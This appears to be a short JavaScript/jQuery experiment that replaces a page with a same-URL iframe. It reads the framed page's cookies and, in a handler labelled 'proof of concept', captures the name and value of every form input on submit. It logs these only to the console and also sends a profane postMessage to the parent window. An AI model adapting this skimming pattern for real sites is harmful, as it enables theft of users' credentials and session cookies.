___.$(function($) {

    // Replace the page with an iframe at the same URL
    ___.retrofit = function() {
        var href = window.location.href;
        var $iframe = $('<iframe>').attr('src', href).attr('style', 'width:100%; border:0; position:absolute; height:100%');
        $('body').replaceWith($iframe);
    }

    // cross-document messaging muckabout
    $(document).on('message', function(event) {
        console.log(event);
    });

    // If this script is living in the top-level (not inside the iframe)
    if (window.parent == window) {

        ___.retrofit();

        $('iframe').on('load', function() {

            history.replaceState({}, '', this.contentWindow.location.href);
            $('title').text($(this).contents().find('title').text());

            // LOL
            console.log(this.contentWindow.document.cookie);

            $(this).contents()
            // Retrieve all form submissions - proof of concept
            .on('submit', 'form', function() {
                $(this).find('input').map(function() {
                    console.log($(this).attr('name'), $(this).val());
                });
            });
        });

    } else {
        // cross-document messaging muckabout
        window.parent.postMessage('Waddup, cunt', 'sick one');
    }
});
